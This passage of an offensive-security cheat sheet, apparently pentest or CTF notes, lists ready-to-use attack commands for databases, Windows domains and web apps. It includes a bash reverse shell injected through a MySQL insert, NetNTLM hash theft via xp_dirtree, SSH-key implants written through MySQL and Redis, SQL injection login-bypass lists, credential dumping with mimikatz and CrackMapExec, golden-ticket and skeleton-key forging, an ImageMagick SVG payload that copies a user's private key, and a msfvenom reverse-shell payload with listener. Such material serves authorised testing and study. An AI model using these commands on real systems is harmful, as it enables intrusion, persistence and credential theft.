<h5>Steal NetNTLM Hash / Relay Attack</h5>
<pre><code class="language-c">SQL&gt; exec master.dbo.xp_dirtree '\\&lt;LHOST&gt;\FOOBAR'
</code></pre>
<h4>MySQL</h4>
<pre><code class="language-c">mysql -u root -p
mysql -u &lt;USERNAME&gt; -h &lt;RHOST&gt; -p
</code></pre>
<pre><code class="language-c">mysql&gt; show databases;
mysql&gt; use &lt;DATABASE&gt;;
mysql&gt; show tables;
mysql&gt; describe &lt;TABLE&gt;;
mysql&gt; SELECT * FROM Users;
mysql&gt; SELECT * FROM users \G;
mysql&gt; SELECT Username,Password FROM Users;
</code></pre>
<h5>Update User Password</h5>
<pre><code class="language-c">mysql&gt; update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
</code></pre>
<h5>Drop a Shell</h5>
<pre><code class="language-c">mysql&gt; \! /bin/sh
</code></pre>
<h5>xp_cmdshell</h5>
<pre><code class="language-c">SQL&gt; EXEC sp_configure 'Show Advanced Options', 1;
SQL&gt; reconfigure;
SQL&gt; sp_configure;
SQL&gt; EXEC sp_configure 'xp_cmdshell', 1;
SQL&gt; reconfigure
SQL&gt; xp_cmdshell &quot;whoami&quot;
</code></pre>
<pre><code class="language-c">SQL&gt; enable_xp_cmdshell
SQL&gt; xp_cmdshell whoami
</code></pre>
<h5>Insert Code to get executed</h5>
<pre><code class="language-c">mysql&gt; insert into users (id, email) values (&lt;LPORT&gt;, &quot;- E $(bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;LHOST&gt;/&lt;LPORT&gt; 0&gt;&amp;1')&quot;);
</code></pre>
<h5>Write SSH Key into authorized_keys2 file</h5>
<pre><code class="language-c">mysql&gt; SELECT &quot;&lt;KEY&gt;&quot; INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
</code></pre>
<h5>Linked SQL Server Enumeration</h5>
<pre><code class="language-c">SQL&gt; SELECT user_name();
SQL&gt; SELECT name,sysadmin FROM syslogins;
SQL&gt; SELECT srvname,isremote FROM sysservers;
SQL&gt; EXEC ('SELECT current_user') at [&lt;DOMAIN&gt;\&lt;CONFIG_FILE&gt;];
SQL&gt; EXEC ('SELECT srvname,isremote FROM sysservers') at [&lt;DOMAIN&gt;\&lt;CONFIG_FILE&gt;];
SQL&gt; EXEC ('EXEC (''SELECT suser_name()'') at [&lt;DOMAIN&gt;\&lt;CONFIG_FILE&gt;]') at [&lt;DOMAIN&gt;\&lt;CONFIG_FILE&gt;];
</code></pre>
<h4>NoSQL Injection</h4>
<pre><code class="language-c">admin'||''==='
{&quot;username&quot;: {&quot;$ne&quot;: null}, &quot;password&quot;: {&quot;$ne&quot;: null} }
</code></pre>
<h4>PostgreSQL</h4>
<pre><code class="language-c">psql
psql -h &lt;LHOST&gt; -U &lt;USERNAME&gt; -c &quot;&lt;COMMAND&gt;;&quot;
psql -h &lt;RHOST&gt; -p 5432 -U &lt;USERNAME&gt; -d &lt;DATABASE&gt;
psql -h &lt;RHOST&gt; -p 5432 -U &lt;USERNAME&gt; -d &lt;DATABASE&gt;
</code></pre>
<h3>Common Commands</h3>
<pre><code class="language-c">postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c &lt;DATABASE&gt;             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
&lt;DATABASE&gt;=# \dt                     // list tables from current schema
&lt;DATABASE&gt;=# \dt *.*                 // list tables from all schema
&lt;DATABASE&gt;=# \du                     // list users roles
&lt;DATABASE&gt;=# \du+                    // list users roles
&lt;DATABASE&gt;=# SELECT user;            // get current user
&lt;DATABASE&gt;=# TABLE &lt;TABLE&gt;;          // select table
&lt;DATABASE&gt;=# SELECT * FROM users;    // select everything from users table
&lt;DATABASE&gt;=# SHOW rds.extensions;    // list installed extensions
&lt;DATABASE&gt;=# SELECT usename, passwd from pg_shadow;    // read credentials
</code></pre>
<h4>Redis</h4>
<pre><code class="language-c">&gt; AUTH &lt;PASSWORD&gt;
&gt; AUTH &lt;USERNAME&gt; &lt;PASSWORD&gt;
&gt; INFO SERVER
&gt; INFO keyspace
&gt; CONFIG GET *
&gt; SELECT &lt;NUMBER&gt;
&gt; KEYS *
&gt; HSET       // set value if a field within a hash data structure
&gt; HGET       // retrieves a field and his value from a hash data structure
&gt; HKEYS      // retrieves all field names from a hash data structure
&gt; HGETALL    // retrieves all fields and values from a hash data structure
&gt; GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
&gt; SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b &quot;username|s:8:\&quot;&lt;USERNAME&gt;\&quot;;role|s:5:\&quot;admin\&quot;;auth|s:4:\&quot;True\&quot;;&quot; # the value &quot;s:8&quot; has to match the length of the username
</code></pre>
<h5>Enter own SSH Key</h5>
<pre><code class="language-c">redis-cli -h &lt;RHOST&gt;
echo &quot;FLUSHALL&quot; | redis-cli -h &lt;RHOST&gt;
(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /PATH/TO/FILE/&lt;FILE&gt;.txt
cat /PATH/TO/FILE/&lt;FILE&gt;.txt | redis-cli -h &lt;RHOST&gt; -x set s-key
&lt;RHOST&gt;:6379&gt; get s-key
&lt;RHOST&gt;:6379&gt; CONFIG GET dir
1) &quot;dir&quot;
2) &quot;/var/lib/redis&quot;
&lt;RHOST&gt;:6379&gt; CONFIG SET dir /var/lib/redis/.ssh
OK
&lt;RHOST&gt;:6379&gt; CONFIG SET dbfilename authorized_keys
OK
&lt;RHOST&gt;:6379&gt; CONFIG GET dbfilename
1) &quot;dbfilename&quot;
2) &quot;authorized_keys&quot;
&lt;RHOST&gt;:6379&gt; save
OK
</code></pre>
<h4>sqlcmd</h4>
<pre><code class="language-c">sqlcmd -S &lt;RHOST&gt; -U &lt;USERNAME&gt;
</code></pre>
<h4>SQL Injection</h4>
<h5>Master List</h5>
<pre><code class="language-c">admin' or '1'='1
' or '1'='1
&quot; or &quot;1&quot;=&quot;1
&quot; or &quot;1&quot;=&quot;1&quot;--
&quot; or &quot;1&quot;=&quot;1&quot;/*
&quot; or &quot;1&quot;=&quot;1&quot;#
&quot; or 1=1
&quot; or 1=1 --
&quot; or 1=1 -
&quot; or 1=1--
&quot; or 1=1/*
&quot; or 1=1#
&quot; or 1=1-
&quot;) or &quot;1&quot;=&quot;1
&quot;) or &quot;1&quot;=&quot;1&quot;--
&quot;) or &quot;1&quot;=&quot;1&quot;/*
&quot;) or &quot;1&quot;=&quot;1&quot;#
&quot;) or (&quot;1&quot;=&quot;1
&quot;) or (&quot;1&quot;=&quot;1&quot;--
&quot;) or (&quot;1&quot;=&quot;1&quot;/*
&quot;) or (&quot;1&quot;=&quot;1&quot;#
) or '1`='1-
</code></pre>
<h5>Authentication Bypass</h5>
<pre><code class="language-c">'-'
' '
'&amp;'
'^'
'*'
' or 1=1 limit 1 -- -+
'=&quot;or'
' or ''-'
' or '' '
' or ''&amp;'
' or ''^'
' or ''*'
'-||0'
&quot;-||0&quot;
&quot;-&quot;
&quot; &quot;
&quot;&amp;&quot;
&quot;^&quot;
&quot;*&quot;
'--'
&quot;--&quot;
'--' / &quot;--&quot;
&quot; or &quot;&quot;-&quot;
&quot; or &quot;&quot; &quot;
&quot; or &quot;&quot;&amp;&quot;
&quot; or &quot;&quot;^&quot;
&quot; or &quot;&quot;*&quot;
or true--
&quot; or true--
' or true--
&quot;) or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
&quot; or &quot;x&quot;=&quot;x
&quot;) or (&quot;x&quot;)=(&quot;x
&quot;)) or ((&quot;x&quot;))=((&quot;x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin&quot; --
admin';-- azer
admin&quot; #
admin&quot;/*
admin&quot; or &quot;1&quot;=&quot;1
admin&quot; or &quot;1&quot;=&quot;1&quot;--
admin&quot; or &quot;1&quot;=&quot;1&quot;#
admin&quot; or &quot;1&quot;=&quot;1&quot;/*
admin&quot;or 1=1 or &quot;&quot;=&quot;
admin&quot; or 1=1
admin&quot; or 1=1--
admin&quot; or 1=1#
admin&quot; or 1=1/*
admin&quot;) or (&quot;1&quot;=&quot;1
admin&quot;) or (&quot;1&quot;=&quot;1&quot;--
admin&quot;) or (&quot;1&quot;=&quot;1&quot;#
admin&quot;) or (&quot;1&quot;=&quot;1&quot;/*
admin&quot;) or &quot;1&quot;=&quot;1
admin&quot;) or &quot;1&quot;=&quot;1&quot;--
admin&quot;) or &quot;1&quot;=&quot;1&quot;#
admin&quot;) or &quot;1&quot;=&quot;1&quot;/*
1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055
</code></pre>
<h4>SQL Truncation Attack</h4>
<pre><code class="language-c">'admin@&lt;FQDN&gt;' = 'admin@&lt;FQDN&gt;++++++++++++++++++++++++++++++++++++++htb'
</code></pre>
<h4>sqlite3</h4>
<pre><code class="language-c">sqlite3 &lt;FILE&gt;.db
</code></pre>
<pre><code class="language-c">sqlite&gt; .tables
sqlite&gt; PRAGMA table_info(&lt;TABLE&gt;);
sqlite&gt; SELECT * FROM &lt;TABLE&gt;;
</code></pre>
<h4>sqsh</h4>
<pre><code class="language-c">sqsh -S &lt;RHOST&gt; -U &lt;USERNAME&gt;
</code></pre>
<h3>Password Attacks</h3>
<h4>CrackMapExec</h4>
<pre><code class="language-c">crackmapexec ldap -L
crackmapexec mysql -L
crackmapexec smb -L
crackmapexec ssh -L
crackmapexec winrm -L
</code></pre>
<pre><code class="language-c">crackmapexec smb &lt;RHOST&gt; -u '' -p '' --shares
crackmapexec smb &lt;RHOST&gt; -u '' -p '' --shares -M spider_plus
crackmapexec smb &lt;RHOST&gt; -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
crackmapexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares
crackmapexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares -M spider_plus
crackmapexec smb &lt;RHOST&gt; -u &quot; &quot; -p &quot;&quot; --shares -M spider_plus -o READ_ONLY=false
crackmapexec smb &lt;RHOST&gt; -u guest -p '' --shares --rid-brute
crackmapexec smb &lt;RHOST&gt; -u guest -p '' --shares --rid-brute 100000
crackmapexec smb &lt;RHOST&gt; -u &quot;guest&quot; -p &quot;&quot; --shares --rid-brute
crackmapexec smb &lt;RHOST&gt; -u &quot;guest&quot; -p &quot;&quot; --shares --rid-brute 100000
crackmapexec ldap &lt;RHOST&gt; -u '' -p '' -M get-desc-users
crackmapexec ldap &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --gmsa
crackmapexec ldap &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --gmsa -k
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --shares
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --lsa
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --sam
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; -M lsassy
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --ntds
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &quot;&lt;NTLMHASH&gt;&quot; --ntds
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -p &quot;&lt;PASSWORD&gt;&quot; --ntds --user &lt;USERNAME&gt;
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &quot;&lt;NTLMHASH&gt;&quot; --ntds --user &lt;USERNAME&gt;
crackmapexec smb &lt;RHOST&gt; -u &quot;&lt;USERNAME&gt;&quot; -H &lt;HASH&gt; -x &quot;whoami&quot;
crackmapexec winrm -u usernames.txt -p '&lt;PASSWORD&gt;' -d &lt;DOMAIN&gt; &lt;RHOST&gt;
crackmapexec winrm &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt
crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --shares
crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --pass-pol
crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --lusers
crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --sam
crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'net user Administrator /domain' --exec-method smbexec
crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt --wdigest enable
crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -x 'quser'
crackmapexec &lt;PROTOCOL&gt; &lt;RHOST&gt; -u ~/PATH/TO/FILE/usernames.txt -p /usr/share/wordlists/rockyou.txt -m modules/credentials/mimikatz.py
</code></pre>
<h4>fcrack</h4>
<pre><code class="language-c">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt &lt;FILE&gt;.zip
</code></pre>
<h4>hashcat</h4>
<blockquote>
<p>https://hashcat.net/hashcat/</p>
</blockquote>
<blockquote>
<p>https://hashcat.net/wiki/doku.php?id=hashcat</p>
</blockquote>
<blockquote>
<p>https://hashcat.net/cap2hashcat/</p>
</blockquote>
<blockquote>
<p>https://hashcat.net/wiki/doku.php?id=example_hashes</p>
</blockquote>
<pre><code class="language-c">hashcat --example-hashes
</code></pre>
<pre><code class="language-c">hashcat -m 0 md5 /usr/share/wordlists/rockyou.txt
hashcat -m 100 sha-1 /usr/share/wordlists/rockyou.txt
hashcat -m 1400 sha256 /usr/share/wordlists/rockyou.txt
hashcat -m 3200 bcrypt /usr/share/wordlists/rockyou.txt
hashcat -m 900 md4 /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm /usr/share/wordlists/rockyou.txt
hashcat -m 1800 sha512 /usr/share/wordlists/rockyou.txt
hashcat -m 160 hmac-sha1 /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 hash.txt SecLists/Passwords/xato-net-10-million-passwords-1000000.txt -O --force
hashcat -O -m 500 -a 3 -1 ?l -2 ?d -3 ?u  --force hash.txt ?3?3?1?1?1?1?2?3
</code></pre>
<h5>Cracking ASPREPRoast Password File</h5>
<pre><code class="language-c">hashcat -m 18200 -a 0 &lt;FILE&gt; &lt;FILE&gt;
</code></pre>
<h5>Cracking Kerberoasting Password File</h5>
<pre><code class="language-c">hashcat -m 13100 --force &lt;FILE&gt; &lt;FILE&gt;
</code></pre>
<h5>Bruteforce based on the Pattern</h5>
<pre><code class="language-c">hashcat -a3 -m0 mantas?d?d?d?u?u?u --force --potfile-disable --stdout
</code></pre>
<h5>Generate Password Candidates: Wordlist + Pattern</h5>
<pre><code class="language-c">hashcat -a6 -m0 &quot;e99a18c428cb38d5f260853678922e03&quot; yourPassword|/usr/share/wordlists/rockyou.txt ?d?d?d?u?u?u --force --potfile-disable --stdout
</code></pre>
<h5>Generate NetNLTMv2 with internalMonologue and crack with hashcat</h5>
<pre><code class="language-c">InternalMonologue.exe -Downgrade False -Restore False -Impersonate True -Verbose False -challange 002233445566778888800
</code></pre>
<h6>Result</h6>
<pre><code class="language-c">spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000
</code></pre>
<h5>Crack with hashcat</h5>
<pre><code class="language-c">hashcat -m5600 'spotless::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:010100000000000078b063fbcce8d4012c90747792a3cbca0000000008003000300000000000000001000000002000006402330e5e71fb781eef13937448bf8b0d8bc9e2e6a1e1122fd9d690fa9178c50a0010000000000000000000000000000000000009001a0057005300300031005c00730070006f0074006c006500730073000000000000000000' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
</code></pre>
<h5>Rules</h5>
<blockquote>
<p>https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule</p>
</blockquote>
<h5>Cracking with OneRuleToRuleThemAll.rule</h5>
<pre><code class="language-c">hashcat -m 3200 hash.txt -r /PATH/TO/FILE.rule
</code></pre>
<h4>Hydra</h4>
<pre><code class="language-c">hydra &lt;RHOST&gt; -l &lt;USERNAME&gt; -p &lt;PASSWORD&gt; &lt;PROTOCOL&gt;
hydra &lt;RHOST&gt; -L /PATH/TO/WORDLIST/&lt;FILE&gt; -P /PATH/TO/WORDLIST/&lt;FILE&gt; &lt;PROTOCOL&gt;
hydra -C /PATH/TO/WORDLIST/&lt;FILE&gt; &lt;RHOST&gt; ftp
</code></pre>
<pre><code class="language-c">export HYDRA_PROXY=connect://127.0.0.1:8080
unset HYDRA_PROXY
</code></pre>
<pre><code class="language-c">hydra -l &lt;USERNAME&gt; -P /PATH/TO/WORDLIST/&lt;FILE&gt; &lt;RHOST&gt; http-post-form &quot;/admin.php:username=^USER^&amp;password=^PASS^:login_error&quot;
</code></pre>
<pre><code class="language-c">hydra &lt;RHOST&gt; http-post-form -L /PATH/TO/WORDLIST/&lt;FILE&gt; &quot;/login:usernameField=^USER^&amp;passwordField=^PASS^:unsuccessfulMessage&quot; -s &lt;RPORT&gt; -P /PATH/TO/WORDLIST/&lt;FILE&gt;

hydra &lt;RHOST&gt; http-form-post &quot;/otrs/index.pl:Action=Login&amp;RequestedURL=Action=Admin&amp;User=root@localhost&amp;Password=^PASS^:Login failed&quot; -l root@localhost -P otrs-cewl.txt -vV -f

hydra -l admin -P /PATH/TO/WORDLIST/&lt;FILE&gt; &lt;RHOST&gt; http-post-form &quot;/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&amp;__EVENTVALIDATION=COOKIE_2&amp;UserName=^USER^&amp;Password=^PASS^&amp;LoginButton=Log+in:Login failed&quot;
</code></pre>
<h4>John</h4>
<pre><code class="language-c">/usr/share/john/ssh2john.py id_rsa &gt; hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt &lt;FILE&gt;
john --rules --wordlist=/usr/share/wordlists/rockyou.txt &lt;FILE&gt;
john --show &lt;FILE&gt;
</code></pre>
<h4>Kerbrute</h4>
<h5>User Enumeration</h5>
<pre><code class="language-c">./kerbrute userenum -d &lt;DOMAIN&gt; --dc &lt;DOMAIN&gt; /PATH/TO/FILE/&lt;USERNAMES&gt;
</code></pre>
<h5>Password Spray</h5>
<pre><code class="language-c">./kerbrute passwordspray -d &lt;DOMAIN&gt; --dc &lt;DOMAIN&gt; /PATH/TO/FILE/&lt;USERNAMES&gt; &lt;PASSWORD&gt;
</code></pre>
<h4>LaZagne</h4>
<pre><code class="language-c">laZagne.exe all
</code></pre>
<h4>mimikatz</h4>
<h5>Dump Hshes</h5>
<pre><code class="language-c">.\mimikatz.exe
sekurlsa::minidump /users/admin/Desktop/lsass.DMP
sekurlsa::LogonPasswords
meterpreter &gt; getprivs
meterpreter &gt; creds_all
meterpreter &gt; golden_ticket_create
</code></pre>
<h5>Pass the Ticket</h5>
<pre><code class="language-c">.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-&lt;RHOST&gt;.LOCAL.kirbi
klist
dir \\&lt;RHOST&gt;\admin$
</code></pre>
<h5>Forging Golden Ticket</h5>
<pre><code class="language-c">.\mimikatz.exe
privilege::debug
lsadump::lsa /inject /name:krbtgt
kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500
misc::cmd
klist
dir \\&lt;RHOST&gt;\admin$
</code></pre>
<h5>Skeleton Key</h5>
<pre><code class="language-c">privilege::debug
misc::skeleton
net use C:\\&lt;RHOST&gt;\admin$ /user:Administrator mimikatz
dir \\&lt;RHOST&gt;\c$ /user:&lt;USERNAME&gt; mimikatz
</code></pre>
<h4>pypykatz</h4>
<pre><code class="language-c">pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam system
</code></pre>
<h3>Exploitation Tools</h3>
<h4>ImageTragick</h4>
<blockquote>
<p>https://imagetragick.com/</p>
</blockquote>
<h4>MSL / Polyglot Attack</h4>
<blockquote>
<p>https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</p>
</blockquote>
<h5>poc.svg</h5>
<pre><code class="language-c">&lt;image authenticate='ff&quot; `echo $(cat /home/&lt;USERNAME&gt;/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&quot;'&gt;
  &lt;read filename=&quot;pdf:/etc/passwd&quot;/&gt;
  &lt;get width=&quot;base-width&quot; height=&quot;base-height&quot; /&gt;
  &lt;resize geometry=&quot;400x400&quot; /&gt;
  &lt;write filename=&quot;test.png&quot; /&gt;
  &lt;svg width=&quot;700&quot; height=&quot;700&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;
  &lt;image xlink:href=&quot;msl:poc.svg&quot; height=&quot;100&quot; width=&quot;100&quot;/&gt;
  &lt;/svg&gt;
&lt;/image&gt;
</code></pre>
<pre><code class="language-c">convert poc.svg poc.png
cp /tmp/poc.svg /var/www/html/convert_images/
</code></pre>
<h4>Metasploit</h4>
<pre><code class="language-c">$ sudo msfdb run                   // start database
$ sudo msfdb init                  // database initialization
$ msfdb --use-defaults delete      // delete existing databases
$ msfdb --use-defaults init        // database initialization
$ msfdb status                     // database status
msf6 &gt; workspace                   // metasploit workspaces
msf6 &gt; workspace -a &lt;WORKSPACE&gt;    // add a workspace
msf6 &gt; workspace -r &lt;WORKSPACE&gt;    // rename a workspace
msf6 &gt; workspace -d &lt;WORKSPACE&gt;    // delete a workspace
msf6 &gt; workspace -D                // delete all workspaces
msf6 &gt; db_nmap &lt;OPTIONS&gt;           // execute nmap and add output to database
msf6 &gt; hosts                       // reads hosts from database
msf6 &gt; services                    // reads services from database
msf6 &gt; vulns                       // displaying vulnerabilities
msf6 &gt; search                      // search within metasploit
msf6 &gt; set RHOST &lt;RHOST&gt;           // set remote host
msf6 &gt; set RPORT &lt;RPORT&gt;           // set remote port
msf6 &gt; run                         // run exploit
msf6 &gt; spool /PATH/TO/FILE         // recording screen output
msf6 &gt; save                        // saves current state
msf6 &gt; exploit                     // using module exploit
msf6 &gt; payload                     // using module payload
msf6 &gt; auxiliary                   // using module auxiliary
msf6 &gt; encoder                     // using module encoder
msf6 &gt; nop                         // using module nop
msf6 &gt; show sessions               // displays all current sessions
msf6 &gt; sessions -i 1               // switch to session 1
msf6 &gt; sessions -u &lt;ID&gt;            // upgrading shell to meterpreter
msf6 &gt; sessions -k &lt;ID&gt;            // kill specific session
msf6 &gt; sessions -K                 // kill all sessions
msf6 &gt; jobs                        // showing all current jobs
msf6 &gt; show payloads               // displaying available payloads
msf6 &gt; set VERBOSE true            // enable verbose output
msf6 &gt; set forceexploit true       // exploits the target anyways
msf6 &gt; set EXITFUNC thread         // reverse shell can exit without exit the program
msf6 &gt; set AutoLoadStdapi false    // disables autoload of stdapi
msf6 &gt; set PrependMigrate true     // enables automatic process migration
msf6 &gt; set PrependMigrateProc explorer.exe                        // auto migrate to explorer.exe
msf6 &gt; use post/PATH/TO/MODULE                                    // use post exploitation module
msf6 &gt; use post/linux/gather/hashdump                             // use hashdump for Linux
msf6 &gt; use post/multi/manage/shell_to_meterpreter                 // shell to meterpreter
msf6 &gt; use exploit/windows/http/oracle_event_processing_upload    // use a specific module
C:\&gt; &gt; Ctrl + z                                  // put active meterpreter shell in background
meterpreter &gt; loadstdapi                         // load stdapi
meterpreter &gt; background                         // put meterpreter in background (same as &quot;bg&quot;)
meterpreter &gt; shell                              // get a system shell
meterpreter &gt; channel -i &lt;ID&gt;                    // get back to existing meterpreter shell
meterpreter &gt; ps                                 // checking processes
meterpreter &gt; migrate 2236                       // migrate to a process
meterpreter &gt; getuid                             // get the user id
meterpreter &gt; sysinfo                            // get system information
meterpreter &gt; search -f &lt;FILE&gt;                   // search for a file
meterpreter &gt; upload                             // uploading local files to the target
meterpreter &gt; ipconfig                           // get network configuration
meterpreter &gt; load powershell                    // loads powershell
meterpreter &gt; powershell_shell                   // follow-up command for load powershell
meterpreter &gt; powershell_execute                 // execute command
meterpreter &gt; powershell_import                  // import module
meterpreter &gt; powershell_shell                   // shell
meterpreter &gt; powershell_session_remove          // remove
meterpreter &gt; powershell_execute 'Get-NetNeighbor | Where-Object -Property State -NE &quot;Unreachable&quot; | Select-Object -Property IPAddress'                                // network discovery
meterpreter &gt; powershell_execute '1..254 | foreach { &quot;&lt;XXX.XXX.XXX&gt;.${_}: $(Test-Connection -TimeoutSeconds 1 -Count 1 -ComputerName &lt;XXX.XXX.XXX&gt;.${_} -Quiet)&quot; }'    // network scan
meterpreter &gt; powershell_execute 'Test-NetConnection -ComputerName &lt;RHOST&gt; -Port 80 | Select-Object -Property RemotePort, TcpTestSucceeded'                            // port scan
meterpreter &gt; load kiwi                          // load mimikatz
meterpreter &gt; help kiwi                          // mimikatz help
meterpreter &gt; kiwi_cmd                           // execute mimikatz native command
meterpreter &gt; lsa_dump_sam                       // lsa sam dump
meterpreter &gt; dcsync_ntlm krbtgt                 // dc sync
meterpreter &gt; creds_all                          // dump all credentials
meterpreter &gt; creds_msv                          // msv dump
meterpreter &gt; creds_kerberos                     // kerberos dump
meterpreter &gt; creds_ssp                          // ssp dump
meterpreter &gt; creds_wdigest                      // wdigest dump
meterpreter &gt; getprivs                           // get privileges after loading mimikatz
meterpreter &gt; getsystem                          // gain system privileges if user is member of administrator group
meterpreter &gt; hashdump                           // dumps all the user hashes
meterpreter &gt; run post/windows/gather/checkvm    // check status of the target
meterpreter &gt; run post/multi/recon/local_exploit_suggester    // checking for exploits
meterpreter &gt; run post/windows/manage/enable_rdp              // enables rdp
meterpreter &gt; run post/multi/manage/autoroute                 // runs autoroutes
meterpreter &gt; run auxiliary/server/socks4a                    // runs socks4 proxy server
meterpreter &gt; keyscan_start                                   // enabled keylogger
meterpreter &gt; keyscan_dump                                    // showing the output
meterpreter &gt; screenshare                                     // realtime screen sharing
meterpreter &gt; screenshare -q 100                              // realtime screen sharing
meterpreter &gt; record_mic                                      // recording mic output
meterpreter &gt; timestomp                                       // modify timestamps
meterpreter &gt; execute -f calc.exe                             // starts a program on the victim
meterpreter &gt; portfwd add -l &lt;LPORT&gt; -p &lt;RPORT&gt; -r 127.0.0.1    // port forwarding
</code></pre>
<h5>Metasploit through Proxychains</h5>
<pre><code class="language-c">proxychains -q msfconsole
</code></pre>
<h5>Auxiliary Output Directory</h5>
<pre><code class="language-c">/home/&lt;USERNAME&gt;/.msf4/loot/20200623090635_default_&lt;RHOST&gt;_nvms.traversal_680948.txt
</code></pre>
<h5>Meterpreter Listener</h5>
<h6>Generate Payload</h6>
<pre><code class="language-c">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LHOST&gt; LPORT=&lt;LPORT&gt; -f exe -o meterpreter_payload.exe
</code></pre>
<h6>Setup Listener for Microsoft Windows</h6>
<pre><code class="language-c">msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST &lt;LHOST&gt;
LHOST =&gt; &lt;LHOST&gt;
msf6 exploit(multi/handler) &gt; set LPORT &lt;LPORT&gt;
LPORT =&gt; &lt;LPORT&gt;
msf6 exploit(multi/handler) &gt; run
</code></pre>
<h6>Download Files</h6>
